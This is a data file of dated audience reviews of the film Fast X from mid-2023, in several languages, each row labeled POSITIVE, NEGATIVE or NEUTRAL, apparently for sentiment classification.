"Jul 15, 2023",NEGATIVE,"Filme totalmente previsível, e o que era previsto ainda foi mal apresentado, não agradou os fãs da franquia e certamente não arrecadou novos, pois com um elenco tão conhecido um ou dois tem um pouco de carisma neste fracasso q gira em torno de um protagonista do qual já cansamos."
"Jul 15, 2023",NEGATIVE,"Granda Barreto. Just lost 2 hours of my life. The edits are so fake, the plot doesn't even make sense. They're trying to please everyone but basically pleased nobody. This used to be such good movie. This one was the worst of all. Choice of music was also awful. Some parts were also so random. I'm so disappointed"
"Jul 14, 2023",NEUTRAL,"Good not great, excited for the next one "
"Jul 14, 2023",NEUTRAL,If you take out the ridiculous plot and separate it from the first film it is an enjoyable action film  but unfortunately the cheesy one liners from the actors make this a movie not to take seriously more of a background movie when you do laundry.
"Jul 14, 2023",POSITIVE,"I think that the storyline is good, but some movie scene is exaggerate, happen things that it are out of the really."
"Jul 13, 2023",POSITIVE,Action packed and jason is great but not as wild as the last ones
"Jul 13, 2023",NEGATIVE,"It's a well known fact that the previous two installments, The Fate of the Furious (2017) and F9: The Fast Saga (2021) didn't exactly hit their mark. Yes, the Fast & Furious franchise has always been self-aware, over-the-top crazy and fun, but the last two entries lacked the fun part, the Fast-family dynamic, and instead went on too far with the stunts that they looked so cartoonish and ridiculous. 

With Fast X, it's safe to say that the franchise is back to form, but it definitely suffers from having too many sub-plots and unnecessary characters.

The film cleverly connects the dots from previous movies, and the callbacks from Fast Five (2011), really help setting up Jason Mamoa's character Dante Reyes. Fast X is, without a doubt, a two-men show, where Vin Diesel and Jason Mamoa get to shine in their roles, while the rest of the cast members, on the other hand, get sidelined for the majority of the runtime, which is actually quite disappointing.

Mamoa truly steals the show, but it's obvious that his character has drawn inspiration from the DC Comics super villain Joker. Tyrese Gibson, Ludacis, Nathalie Emmanuel and Sung Kang, who are fan favorites and allies of Dom, are barely in the half of the movie, while Michelle Rodriguez, Jason Statham, Charlize Theron and Jordana Brewster only appear in a couple of scenes. However, there are a couple of new likable additions to the cast who have the potential to become fan favorites in the future installments, such as Daniela Melchior, Leo Abelo Perry and Brie Larson. 

Compared to F9: The Fast Saga, where there were cartoonish stunt sequences such as cars flying to space, and swinging between trees and mountains (like Tarzan), Fast X has taken a little more subtle approach to its stunt sequences, but they are still fun, mindless and over-the-top, exactly like the fifth, sixth and seventh installments. 

The Fast & Furious franchise is also widely known for brining dead characters back to the later installments, which absolutely doesn't make any sense. It's like the core characters and the audience were mourning for nothing, and there was no point for seeking revenge in the previous films. Ever since Chris Morgan, who wrote the screenplay from The Fast and The Furious: Tokyo Driff (2006) to The Fate of the Furious, got replaced with other writers, the franchise started to go downhill from there because the storytelling lacked the depth and creativity. 

Overall, Fast X is an improvement compared to The Fate of the Furious and F9, but still an average entry that doesn't quite live up to the best ones of the bunch; Fast Five, Furious 6 (2013) and Furious 7 (2015)."
"Jul 13, 2023",NEGATIVE,"good action, not memorable. "
"Jul 13, 2023",NEUTRAL,Jason Momoa's character is the only thing that kept me entertained. I don't know why I keep coming back to watch these unrealistic stunts I guess I'm trying to see it to the end.
"Jul 13, 2023",NEUTRAL,"Fast cars that sometimes defies the laws of physics, not bad I guess."
"Jul 12, 2023",NEUTRAL,"Very entertaining and fast-paced. Not Oscar-quality by any means, but that isn't why  we watch these movies. Overall a fun movie."
"Jul 12, 2023",NEUTRAL,"Tired of the same old family theme, bad guys becoming good guys, characters coming back from the dead plots. 
However, Jason Momoa's character is what makes this movie fun.  He is fun, wicked and insane (although looks fat at times). His motive for revenge against the gang that robbed and murdered his father is justified, making me (and probably other audience)   root for him throughout the movie, and enjoy watching this villain (or is he an antihero?) kicking Toretto's butt."
"Jul 12, 2023",NEGATIVE,Entertaining but unbelievable
"Jul 12, 2023",NEGATIVE,Just stop already who's still watching this ship
"Jul 12, 2023",POSITIVE,Jason Mamoa was a welcome refreshing perfect villain.  The action scenes are always what we come for but Jason had us rooting for the Villian at times.
"Jul 12, 2023",NEGATIVE,This is the worst thing that happened to me.  I left the theater half an hour after the movie started.
"Jul 12, 2023",NEGATIVE,They should just make him super man or sell the franchise to bollywood because fast and furious are getting seriously ridiculous
"Jul 12, 2023",POSITIVE,Great action packed movie! I hope Dom and the rest of the crew can take down Donte Reyes. And welcome back Dwayne Johnson and Gal Gadot!!
"Jul 12, 2023",POSITIVE,"Pienso que estas peliuclas las están alargando bastante, hasta el punto donde puede que no hay una trama en especifico, o nueva en general, lo cual la hace muy repetitiva, o eso siento yo, pero el villano maníaco de Jason Momoa le da una sacudida a la franquicia."
"Jul 11, 2023",POSITIVE,The tenth installment actually got lots of things happening right away as it is just the beginning and the continuity of the so-called ridiculous franchise. But it could still holds up to become an enjoyable ride
"Jul 11, 2023",NEUTRAL,"It is better than the previous movie and has some of the best characters in the whole franchise. Though it can be a little wild, it is in a good way!"
"Jul 11, 2023",POSITIVE,this is a funny movie
"Jul 11, 2023",NEUTRAL,This movie was ok after the 7th movie it is kinda lack luster at best it had good action moments. The only thing is the move is less about cars than  the fi1sr 2nd and Tokyo
"Jul 10, 2023",POSITIVE,"I was expecting outrageous and unrealistic together with great action and FAMILY, and I got it.;
Casting->4.5  
Characters->4.0   
Character Development->3   
Story->3   
Action->5  
Score->3.9"
"Jul 10, 2023",NEUTRAL,"I kinda liked this movie personally, but, I was very disappointed at the ending… I felt like the movie was missing something and It was too long, but somehow, was very fast paced, Which I genuinely hate. I like average-paced movies with an average runtime. I wouldn't have mind if the movie was longer but, at least, Make it average paced. The whole film felt like it was just action ON ACTION ON ACTION. At one point, I even fell asleep. But, Anyways, the action scenes were okay, I liked the some of the characters humors. But some, it was very cringey and hard to watch. Above all, THE ENDING IS SO BAD. Like, how did everyone just die? And also the cliffhanger and the random appearance of Gal Gadot made me felt like I wasted 12 dollars just to watch a pilot episode of an action TV show. A 2 AND A HALF HOUR ONE WITH THE WORST CLIFFHANGER I'VE SEEN IN HISTORY. So, yeah, I hope you enjoyed or hated my review. Be sure to stay safe. X."
"Jul 10, 2023",NEGATIVE,"The first 3 fast and furious movies were great, since then each one has gotten worse and worse. Jason momoa is horrible in fast 10, talk about trying to hard."
"Jul 10, 2023",POSITIVE,"Great action, technology and cars"
"Jul 9, 2023",NEGATIVE,"Felt like I paid all the money to say half of a movie, and nobody warned me beforehand. The worst thing is the half I saw was boring, predictable, self-righteous, devoid of any drama and not inventive at all. If anyone really wants to see this movie, better wait to rent it on Redbox for $2. Me personally, I am very disappointed, and not interested to see the other half, unless it's free or shown on my streaming channel."
"Jul 9, 2023",NEGATIVE,"O filme não é ruim, segue o mesmo script de todos os outros de toda franquia, impressiona nos efeitos especiais. Então se quer ver um filme fácil sem precisar usar tanto a cabeça é o melhor.."
"Jul 9, 2023",POSITIVE,"It was a great mix of cars and action, although, for me the franchise played out after the seventh movie and now it's mostly prolonging. For me Jason Momoa's casting was the greatest decision made for the movie. It was pretty decent given the circumstances of the whole franchise."
"Jul 9, 2023",POSITIVE,This movie was hilarious. A ridiculous Fast movie is ALWAYS a fun watch. Jason Momoa was really good in this in particular.
"Jul 9, 2023",NEGATIVE,"As the Fast and Furious franchise stands, it has progressively decreased in believability and overall entertainment. Straying too far from its roots as a series based on racing, Fast X is just another action movie that tries too hard to cater to a fantastical aspect of Mission Impossible. 
While it may carry itself as a high stakes, fast paced action movie - to which it does well - the convoluted criss-crossing of stories and the extensive list of associated characters make the movie more of a puzzle than it needs to be. 
Overall, Fast X was more of a Mission Impossible movie than a Fast and Furious movie."
"Jul 9, 2023",NEUTRAL,The ending SUCK!!!!!
"Jul 9, 2023",POSITIVE,"Really fun movie, that's it"
"Jul 8, 2023",POSITIVE,Liked n loved the movie was awesome amazing  great
"Jul 8, 2023",NEUTRAL,"Its just a fine movie. That's really all it has going for it, everything's so rushed but hey, if you like seeing things blow up and struggle with sentence comprehension you'll love this film."
"Jul 7, 2023",POSITIVE,Crazy and fantastic experience in cinema while watching this movie
"Jul 7, 2023",NEGATIVE,"Yes, a lot of action, and the first part of the action sequence was borrowed from a previous movie.  I am sure that some writer throught it was great to include the action scene from a previous movie, as a flashback, fill-in section.  To me it was a cheap way to fill-in a movie time line, and saving money on the film.  In other words, action for cheap.  The plot seemed disjointed, and I DEFINITELY did NOT like the ending."
"Jul 6, 2023",NEGATIVE,It's not the fast and furious it used to be
"Jul 6, 2023",NEUTRAL,"Love these movies, but I don't know that the 2 part format is best for this series. Felt stretched at times. Additionally, they need to address the Brian O'Conner situation. I understand the feelings and respect associated with Paul Walker, but the character deserves better than just being off screen. Brian would not sit on the sidelines, and his continued absence continues to degrade each sequel."
"Jul 6, 2023",POSITIVE,Absolutely loved this movie!! Great from start to finish.
"Jul 6, 2023",POSITIVE,Hated 9 but loved 10. They brought the fun back and created a villain that is just too fun to watch. Over the top and crazy as expected but a true rollercoaster of a ride!
"Jul 6, 2023",NEGATIVE,"The action in this film is so dumb, like its not realistic at all and the acting is terrible"
"Jul 6, 2023",NEGATIVE,"Wtf i do not know why i am so stupid because of going to watch this whether the real story ended years ago, now it is just a nice story, but are the new films into the real and DNA story of this?"
"Jul 6, 2023",NEGATIVE,"The Answer to the Question: ""How bad can we make a movie?"" That was so cringey my molars are as flat as chiclets. 

The Answer to the Question: ""Can we make a movie that makes people want to self-harm?"" I fisted myself twice to distract myself from the pain of wanting to put out my eyes! 

The writer's strike totally makes sense."
"Jul 6, 2023",POSITIVE,Its another great car crashing unbelievable movie just like all the rest. It has twists and turns.
"Jul 6, 2023",POSITIVE,Fue una de las únicas películas que me motivó ir al cine. Tal vez tiene un exceso  de acción pero 100% entretenido.
"Jul 5, 2023",NEUTRAL,This film is good but this series has been overblown. Though it is a much better watch than fast 9 and relates back to previous films is a good story . There is definitely something missing from this film . Jason Mamoa is very unconvincing as a villain he's just not believable as a villain . His performance can best be described as a parody of Joaquin phoenixs joker. The rest of the film is great although this Franchise is tapped out and needs a break . Unfortunately with fast 11 and 12 already announced it's going to be a while before we get that break .
"Jul 5, 2023",NEGATIVE,"Brie appearance in the movie ruined whole movie. 
Movie in general is not interesting at all, idiotic dialogs and creativity at all.
Not recommended movie."
"Jul 5, 2023",POSITIVE,I have always been a fan of this series
"Jul 5, 2023",POSITIVE,I definitely will watch it 2nd time!
"Jul 5, 2023",NEGATIVE,"I'm a long time fast & furious fan, & this one lacked a subsequent story line & was lame at best.  A very big disappointment!"
"Jul 4, 2023",POSITIVE,"Great popcorn flick!  Went into it knowing it was Part 1 of a two-parter, so the cliffhanger ending didn't surprise me."
"Jul 4, 2023",NEUTRAL,great action.  storyline was so-so.  mamoa was the only fun character.  Above all.  no ending.  cliffhanger no ending.  boo!  put part 1 in the title if you aren't giving me a proper ending.
"Jul 4, 2023",NEGATIVE,These movies need a reboot of some kind.  It felt like watching 10 different scripts put together with tape…loose tape.   I love a good action movie and somethings that perhaps stretch reality but this is full of nonstop stunts that just defy physics to all degree.  Classic dodge chargers falling out of planes on to the street in mint condition as an example is almost comical..and its 2.5hrs of this kind of thing.  Have been a fan of the franchise…but at this point the story is played out.  Reboot. Rethink.  Lets Go.
"Jul 4, 2023",POSITIVE,Best & Exiting Movie
"Jul 4, 2023",NEGATIVE,I'm tired of the diesel everybody is the same they tried but just not a good movie …
"Jul 4, 2023",NEUTRAL,"It is a trip down a memory lane of plot twist, cameos and callbacks to previous films, elevated mainly by Jason Momoa's crazy performance as the villain Dante out for revenge upon Dom and his ‘family'. Other than that it is all the usual high-energy action and unrealistic car chase scenes, set to a pumping soundtrack, which makes it actually kind of fun."
"Jul 4, 2023",POSITIVE,If you need the thrill of speed should watch this series of movies
"Jul 4, 2023",NEGATIVE,"The most ridiculous movie. horribly written, produced and with that star power they couldn't pull off a remotely entertaining movie. God Awful..."
"Jul 4, 2023",POSITIVE,Love love loved it! Going back again tomorrow to watch it again with my son.
"Jul 4, 2023",NEGATIVE,I knew it would be over the top kind of action but everything was just cheesy and and kind of dumb. Glad my brother paid for the money and not me.
"Jul 4, 2023",NEGATIVE,"I think  this franchise jumped the shark in Fast 9. I wanted to like it, but so many action scenes were completely absurd and unbelievable. I like the actors but story and action scenes  were awful."
"Jul 4, 2023",POSITIVE,"Great action, great suspense,loved the characters. Can’t wait to see the next sequel"
"Jul 4, 2023",POSITIVE,Lots of great actors and actresses in the genre of this movie. Lots of action and excitement. Lots of believable action such as a young boy jumping from one car to another while the cars are spinning at high speed. Who could not like this high action packed movie.
"Jul 3, 2023",NEGATIVE,"As a fan who has been a part of this since the beginning it's just a letdown. Should have been the last one, will definitely be the last one I pay to see in a theater."
"Jul 3, 2023",POSITIVE,"Cómo fan de la saga está pelicula me encantó, las escenas de acción son increíbles, la actuación de Jason Momoa es muy buena e interpreta demasiado bien el papel de villano, los chistes muy buenos también, en fin todo es perfecto, me hizo sentir muchas emociones a lo largo de la película y ni hablar de como me dejó el final, superó por mucho mis expectativas, simplemente me encantó y fue la mejor película que ví en el año, no intentes verle el sentido a la película o a las escenas de acción intensa, solo disfrútala."
"Jul 3, 2023",NEGATIVE,Really ridiculous movie
"Jul 3, 2023",NEGATIVE,That movie was a waste of time
"Jul 3, 2023",POSITIVE,Must see the 2023 movie.
"Jul 3, 2023",POSITIVE,"What a movie! It manages to blend action with emotion flawlessly. This franchise never disappoints, and what an ending! I hope the next film surpasses this one and closes it off with a bang."
"Jul 3, 2023",NEUTRAL,"Fast X estuvo demasiado chistosa 🤣
Hay escenas de acción que siguen desafiando a toda costa las leyes de la física; un elenco bastante extenso y con muchas más explosiones. 
Con una trama bastante meh' jajaj pero cumple con lo que ofrecía."
"Jul 3, 2023",NEGATIVE,"I really have no idea what the heck I just watched. Vin diesel ruined all these last 7-8 movies. The only one worth a crap is the very first. This one by far takes the cake as most cringe, far fetched, unbearably hard to watch movie in the series. Oooo I'm vin diesel I'm going to walk around flexing the entire movie with my fists balled up and mention family one thousand times with terrible flash backs. This movie was so bad, not even getting all these decent/ good actors in the movie could make it better. Seriously though when did EVERYONE LEARN TO FIGHT NOW?! I mean seriously every single person can beat up trained mercenaries?! What the f**k is that?! None of the story line is convincible at this point it's all just random B.S. Long story short this movie is terrible and your ""family"" shouldn't waste their time watching it."
"Jul 3, 2023",NEGATIVE,"There is so many things wrong with this movie, 
Even a low budget/new graduate director and story writer  could do better directing and story writing .. tasteless .."
"Jul 3, 2023",NEGATIVE,"Some good effects, Diesel couldn't act his way out of a paper bag. Jason Momoa and Alan Ritchson still the show with good performances, and hit looks."
"Jul 3, 2023",POSITIVE,great but has a part 2 to follow..
"Jul 3, 2023",NEUTRAL,"It's a F&F movie. After spending the entire runtime bringing back old characters, they let you know they're doing another one."
"Jul 3, 2023",NEGATIVE,"It was a fairly decent movie coming from someone who loves action movies. This was heavily packed with action but the directors didn't think ahead of action. Jason Momoa's role was miraculously played and kept me on the edge of my seat throughout the movie, but the movie itself wasn't that good."
"Jul 3, 2023",NEGATIVE,la saga tuvo un rumbo equivocado que asco de película
"Jul 2, 2023",NEUTRAL,"Villain is a combination of the Joker and Luther from Batman. Tiring character.  Typical fun ride. Unfortunately, a terrible cliff-hanger ending. Calling the movie a Part 1 would have given a heads up instead of a disappointment."
"Jul 2, 2023",POSITIVE,I can't believe this is 56%. It should be at least 57%. All joking aside the movie has some fast action scenes. I enjoyed it.
"Jul 2, 2023",NEGATIVE,"I understand the ""fast"" franchise is about mindless action but if the narrative itself and written is bad then it can really become unwatchable. And unfortunately this is what I felt with fast X. The writing, the plot was so bad. I would maybe give it a star and a half for Jason Mamaoas performance."
"Jul 2, 2023",NEGATIVE,"pitié, achevez les et qu'on en finisse avec cette série de films."
"Jul 2, 2023",NEGATIVE,"Absolutely the worst film iv seen,acting is terrible . Brought it and i wish i didn't bother. If your between the age of 13-16 u might enjoy it"
"Jul 2, 2023",NEUTRAL,It was a decent Fast installment. Lots of action to keep you entertained and Vin and the rest of the crew did their thing well. The one thing I couldn't stand about the movie was Jason Momoa and his over the top flamboyance. Just felt like too much and extremely off-putting. I thought John Cena would go down as the worst character in the franchise but Cena was almost a breath of fresh air compared to Momoa. Momoa is corny and cringe throughout the movie.
"Jul 2, 2023",POSITIVE,"It's electrifying! The cliffhanger ending was a great move, it leaves you craving for more of the action. I was tired of the Fast franchise ending the same way ""family BBQs"". I can't wait for the last one next year!!!"
"Jul 2, 2023",POSITIVE,"Very entertaining and some good messages. Fast cars , hot girls and lots of action as you would expect, but well done and some substance as well "
"Jul 2, 2023",POSITIVE,엄청난 스케일의 액션이 가득한 영화입니다! 매우 재밌게 봤습니다!
"Jul 2, 2023",NEUTRAL,"Not bad, but ends on a cliffhanger and not as good as other recent entries in the series."
"Jul 2, 2023",NEGATIVE,I'm a huge fast and furious fan. Having said that this one missed the mark. It's more silly than it is good. It's sad to see how far this franchise has fallen.
"Jul 2, 2023",POSITIVE,"Full action from the start of the film, Fast X does not leave you wanting more. Great cast chemistry and plot connections to previous Fast & Furious films. Chase scenes are fresh and exhilarating. The ending was abrupt but looking forward to part 2."
"Jul 2, 2023",POSITIVE,"Alot of intense action, Cameo actors unexpected

Didnt care for the ending tho !"
"Jul 1, 2023",POSITIVE,Fantastic stunts and action. Great lineup of actors. Just what I expected from the Fast franchise.
"Jul 1, 2023",NEUTRAL,"it's good, decent watch, the movie moved along pretty quick which was nice. definitely go during a discounted price."
"Jul 1, 2023",NEUTRAL,"Directo: lejos de la época de gloria de las primeras películas pero así y todo me gusto. Sabemos como va a ser esto, sabemos que cada escena con un auto va desafiar las leyes de la física pero igual la disfrute; en cuanto a historia y ritmo esta me pareció muchísimo mejor que al menos las 3 ultimas (ni hablar de la nefasta novena parte que prefiero no recordar). Mas que nada hay algo que destaca demasiado acá y es el villano: Jason Momoa es extraordinario y se come la pantalla en cada escena que aparece, logra ser intimidante y divertido a la vez. Ahora si tengo algo de expectativa de ver como sigue esto."
"Jul 1, 2023",POSITIVE,Masterfully written - great cliffhanger can't wait for Xl
"Jul 1, 2023",POSITIVE,Love the action like always.
"Jun 30, 2023",NEGATIVE,"Posing cars, posing women. Actors reading lines like ""my line is this"", your line is that. Instagram:the movie. Completely vapid L.A rubbish. At least there wasn't any L.A vocal fry."
"Jun 30, 2023",NEGATIVE,The good guy destroys the neighborhood. Sends off a bomb. Kills or injured a lot of innocent people . I'm glad he didn't come t my neighborhood. After that I stopped watching this really bad movie. It can only get stupider
"Jun 30, 2023",NEUTRAL,"Not best movie form franchise, neither the worst. Jason Momoa saves some parts."
"Jun 30, 2023",NEGATIVE,"what a load of crap, waste of time"
"Jun 30, 2023",POSITIVE,The movie was really good but the ending left a lot of unanswered questions.  I think its set up for another movie.
"Jun 30, 2023",NEUTRAL,"More of the same, but shouldn't it be?"
"Jun 30, 2023",NEUTRAL,"Today in bad movies that are good, this is one of those! Jason Momoa really steals the show and if it wasn't for him, this movie would have nothing to offer other than the usual nonsense... At what point did they lose their way? Go to the movies, enjoy this passion and eat lots of popcorn and soda!"
"Jun 30, 2023",POSITIVE,So much better than the last film. More cars and less outer space. Love seeing all the old characters.. feels like all the family will be in the final film.
"Jun 30, 2023",POSITIVE,This movie was amazing fantastic I mean I heard lot of miss feeling about this movies to fans but I was shocked how good of villain Jason Momoa was I was surprised to see him take role of fantastic villain one of tough bad guys for Toretto team put a lot of effort in this movie I will say this you might not agree with me on this but this my opinion there where some family parts but not as much family time than last time but a lot of racing this movie but they where trying to keep Brian safe although Jacob Toretto isn't out of woods yet but I am not so sure he dead because Han was able to be saved by mr Nobody but we will not know if mr nobody's saved Jacob when he was driving the Cannon car this a possibility he was able to kick the door open jumped out jumped in one of mr nobody getaway cars he might be in safe house somewhere or with mr nobody to try and get the CIA to be on Toretto crew side but also try to get rid of that police guy who sadly turn his back because I didn't see this in movie but Dom Toretto said is last words before the movie ended that he forgot about one thing his car which makes me believe Dom Toretto has kept his electric muscle car a secret but I could be wrong about Jakob it could happened or he is confirmed dead but we will see if he pops out in fast and furious 11 but I saw something twitter that they might split this final in to three parts which this franchise would get total of 12 movie which is to much I do agree should stop making this movies but if you think of its way to give all the actors more money plus extra movie because the producer asked Vin Diesel what will happened to Dominic Toretto character in future if they want to make fast X trilogy they should because if they already thinking of making Hobbs and Shaw 2 they should make 12 fast and furious movies because they brought Dwayne Johnson back to help bring down Jason Momoa. Which we need three movies because they won't be able to defeat Jason Momoa part 2 because now he has partner it will take at least three part finals to in order we all need to understand when Cipher was bad guy so if she had played villain for three movies so far than Jason Momoa villain should be equal amount of movies of being villain his character hasn't been villain so story hasn't ended up so I hope producer does decide to make three parts in my arrogant opinion that the actors need third movie because right now the screenwriter are having hard time getting paid if they make three movies then they could get more money with making three parts because that would give the actor more money after third movie all actors can enjoy celebrating 12 years of making movie franchise!. So don't because angry or frustrated if Louis Leterrier decide to make this finale split in to three parts instead of original idea of three parter because that's the only way they can make more money that it would help stop causing worldwide problems like delaying favorite TV and new movies that are so pose come out so let the Screenplayers to what they want because they don't make lot of money they might go on strike if this doesn't happens this message goes out to all the movie critics out there that it's tough for people to make movie these past few years with inflation with food and gas prices go way up to extreme level of prices which means lot of people need gas to get to the studio which they can't do it if they don't get paid extra for making movies so they need new contracts so they need to make deal that both people won't be happy about the agreement but it's way that both people studio also including screenplayers both get there way because that's all Airline companies and there pilots and their flight attendants to keep there service so that's all I am going to say so this movie is must watch. Thank for your time to read my review for fast X.
"Jun 30, 2023",NEGATIVE,"I quit watching the fast and the furious franchise around #5, it just got way to silly and over the top for my liking. I went to watch this movie and yet again I wasn't impressed. Jason Momoa is one of my favorite actors currently and he looked like he was having a blast on this set, however the corny, childish and silly characteristics they gave him on this movie just completely took me out. It was extremely hard to see him menacing at any time because of his little child like mannerisms. I should have just waited for it to stream, knowing what I know now I would never have allowed myself to red box this movie much less go to the theater to watch."
"Jun 30, 2023",NEGATIVE,"After two decades and ten installments, the Fast and Furious franchise has strayed far from its thrilling original and delved into the realm of the ludicrous. The repetitive plot lines and unrealistic car stunts have become tedious. Vin Diesel and the rest of the cast, resurrected or new, are hardly doing any acting anymore and look like a bunch of adults playing pretend. The movie lost its emotional core after the seventh part, and every sequel that came after has been unintelligent and derivative. The fact that three more films are in the works shows Hollywood's greed for creating mindless cash grabs."
"Jun 30, 2023",POSITIVE,It's really exciting to watch. It's very beautiful. I recommend everyone to watch it.
"Jun 30, 2023",NEUTRAL,Will say not the best in series but was better than IX.
"Jun 30, 2023",NEGATIVE,Even worse than the last one. Way to crash and burn an almost infallible franchise
"Jun 30, 2023",POSITIVE,"I watch these movies with so much loyalty I literally just don't get people who criticise them, sure sometimes the flying cars can get a little overwhelming but I'm gonna stick it out with them, family❤And I genuinely think Fast X is so much better than fast 9"
"Jun 30, 2023",POSITIVE,"After the ludicrous F9, Jason Momoa steals the show as the flamboyantly vicious villain, Dante, in Fast X. This franchise still has plenty of Vroom to continue with an endearing cast of characters I would love to join for beers & barbecue ribs. The over the top car chases are just dessert at this point."
"Jun 30, 2023",NEUTRAL,Bro just family again....
"Jun 30, 2023",POSITIVE,"Finally back to basics with fast cars, great races, pithy commentary, and improbable escapes. I loved it (way more than Fast9). I can't wait to see who makes it to Fast11."
"Jun 30, 2023",NEGATIVE,Worst FAST movie so far
"Jun 30, 2023",NEGATIVE,There's such a thing as having too much faith. There comes a point where you wish the movie (and the franchise) would just end already. The problem is that these movies continue to be hilariously entertaining.
"Jun 29, 2023",NEGATIVE,Definitely the worst F&F movie of all of them...I love the older ones but this is super cringe and bad
"Jun 29, 2023",POSITIVE,My favorite movie franchise because it’s all about family and that’s what it’s all about for me personally! Best movie I’ve ever seen!
"Jun 29, 2023",POSITIVE,Absolutely satisfying to watch
"Jun 29, 2023",POSITIVE,"This movie I thing was the most fun to watch out of all of them,not the best one but still was a good movie!"
"Jun 29, 2023",POSITIVE,Too much action Action is what I like
"Jun 29, 2023",POSITIVE,如果您喜欢快速而激烈的动作，那么《Fast X》将为您带来乐趣
"Jun 29, 2023",POSITIVE,The movie was heart wrenching and a stopping the whole time! Jason Malmoas character was phenomenal!
"Jun 29, 2023",POSITIVE,Is a nice movie. I lovin it.
"Jun 29, 2023",POSITIVE,IT WAS AMAZING. Except for the cliffhanger
"Jun 29, 2023",NEUTRAL,"A certain step up from the past few fast movies. The Paul Walker plot holes shine brightest here however, as his absence grows harder and harder to explain"
"Jun 28, 2023",NEGATIVE,"Very sad to see how much of a one-dimensional joke this franchise has become. I really liked the movies up until Furious7, which was already really absurd, but it still worked because I cared about the characters, especially Brian. But now, all the characters have become so extremely shallow and the action scenes so unrealistic and random, that there is nothing to keep me engaged. If neither characters nor physics matter at all, I might as well be looking at random noise."
"Jun 28, 2023",NEUTRAL,"O filme é bom para assistir, já que o Jason Momoa está épico neste filme. O problema do filme é sempre trazerem de volta personagens com arcos fechados ou não tão relevantes."
"Jun 28, 2023",NEGATIVE,"As a fan of the Fast and Furious franchise, this one is bad."
"Jun 28, 2023",POSITIVE,It was action packed. Can't wait for the next one.
"Jun 28, 2023",NEUTRAL,"Não é o pior filme da franquia, mas com certeza não é o melhor, mas vale a pena assistir"
"Jun 28, 2023",NEGATIVE,"by far one of the worst movies ive seen in my entire life, characters appearing from nowhere that we are supposed to care about, for example the brazilian sister in law, cringed me to HELL when she said.... take care of your son.....MY NEPHEW. 

LOL, top screenwriting there.

action was lame, and boring, effects where ok, sometimes very amateur like the bomb on fire, the pacing BORING, roman should die a glorious death because he is pointless also not funny. 

what else can i say? the movie was so bad i needed to express myself so i signed up to rotten tomatoes for the first time, even The Rise of Skywalker couldnt do that lol"
"Jun 28, 2023",NEGATIVE,"I could waste my time by writing a full-on detailed paragraph on why this movie is terrible, but I know I can sum it all up in about 1 sentence. 
This movie doesn't understand physics, characters, dialog, fight scenes, emotions, or how kids function.
It's not enjoyable to watch in any manner. The Cgi is wrong and bad, the logic is nonexistent and it's just not good in any manner."
"Jun 28, 2023",POSITIVE,"it's an action-packed adventure that delivers non-stop excitement. With jaw-dropping visuals and thrilling stunts, it keeps you on the edge of your seat. The cast's chemistry and well-executed action sequences make it a thrilling ride. While the dialogue can be cliché at times, the film's overall energy and adrenaline rush make it an enjoyable experience. Strap in for a wild and exhilarating adventure with Fast X!"
"Jun 28, 2023",POSITIVE,Excellent movie highlighting Jason Momoa
"Jun 28, 2023",POSITIVE,"Im  Fast X Fans ! Finally waiting they comeback. Even some of the Og actors are not here but , they did act and the whole movie show me a big suprise ! climax change very smoothly. I like it so much !"
"Jun 28, 2023",NEUTRAL,"I mean you can't give it 5 stars, its Fast and the Furious...and by now you know what you are going to get every time...and i'm good with that."
"Jun 27, 2023",NEUTRAL,"Fast and Furious, the latest installment in the adrenaline-fueled franchise, delivers an enjoyable cinematic experience with its trademark high-octane action sequences. While it boasts some thrilling moments and an exceptional performance by Jason Momoa as a flamboyant villain, the film falls short in terms of realism and occasionally struggles with its CGI execution.

One of the film's strongest aspects is undeniably the well-crafted action scenes. Fans of the franchise will not be disappointed, as Fast and Furious continues to push the boundaries of vehicular stunts and daring escapades. The pulse-pounding car chases, intense hand-to-hand combat, and explosive set pieces are sure to keep viewers on the edge of their seats. Directorial choices and choreography combine to create sequences that are both visually stunning and emotionally engaging.

A standout performance by Jason Momoa adds an extra layer of excitement to the film. Momoa's portrayal of the flamboyant villain brings charisma, intensity, and a magnetic presence to the screen. His ability to command attention and infuse the character with personality elevates the overall viewing experience. Momoa's presence serves as a compelling foil to the film's protagonists, adding depth to the narrative and raising the stakes of the conflict.

However, the film does stumble in terms of realism. While Fast and Furious has never been known for its adherence to real-world physics, this installment stretches believability even further. Some of the stunts and action sequences defy the laws of physics to a degree that might strain the suspension of disbelief for certain viewers. It's important to approach the movie with a willingness to embrace the over-the-top nature of the franchise.

Additionally, the CGI employed in certain scenes leaves something to be desired. While the film's practical effects and practical stunts are impressive, the reliance on computer-generated imagery is occasionally evident. There are moments when the CGI feels noticeably artificial, taking away from the immersion and impact of those particular scenes. A more seamless integration of practical and digital effects could have helped to maintain consistency throughout the film.

Overall, Fast and Furious offers an enjoyable ride for fans of the franchise. The captivating action sequences, buoyed by Jason Momoa's remarkable performance, are the film's strong points. However, those seeking a more realistic experience may find themselves grappling with the film's extravagant disregard for physics and occasional lapses in CGI quality. Despite these shortcomings, Fast and Furious remains a thrilling and entertaining addition to the series, delivering the exhilaration and escapism that fans have come to expect."
"Jun 27, 2023",POSITIVE,"This movie is incredible, there's nothing more to be said. A return to form."
"Jun 27, 2023",NEUTRAL,This is just stupid they are all stupid if you can put that aside it alright
"Jun 27, 2023",NEGATIVE,This was rotten.  By far the worst Fast & Furious movie of the bunch.  Everything was so implausible.  The injection of these random people like John Cena was laughable.  I'm a fan of the franchise but this movie was TERRIBLE!
"Jun 27, 2023",POSITIVE,Over the top madness but a lot of fun. I wish they would do realistic stunts like they did in the early movies but I still enjoyed it.
"Jun 27, 2023",NEGATIVE,Should’ve ended it already! 
"Jun 27, 2023",POSITIVE,Never disappoint me.. great action and sound effect!
"Jun 27, 2023",NEUTRAL,Exactly what you'd expect from a 10th franchise movie
"Jun 27, 2023",POSITIVE,Plenty of action and twists to keep you interested. I enjoyed the character development and storyline. I like how it ended. Cant wait to see the next one. 
"Jun 27, 2023",NEGATIVE,Lots of undeveloped characters and absurdist scenes. But it is better than the previous film.
"Jun 27, 2023",NEGATIVE,Probably the worst one yet
"Jun 27, 2023",POSITIVE,A movie that I have watched it since I'm still on school and it won't make me disappointed
"Jun 27, 2023",NEGATIVE,La verdad han usado la misma fórmula de siempre misma historia y no tenía ninguna expectativa de esta película en si la película es buena para pasar el rato pero no para volverla a ver denuevo es cosa de esperar lo que le espera a esta saga
"Jun 26, 2023",POSITIVE,Very entertaining with great action and special effects. Looking forward to the next installment!
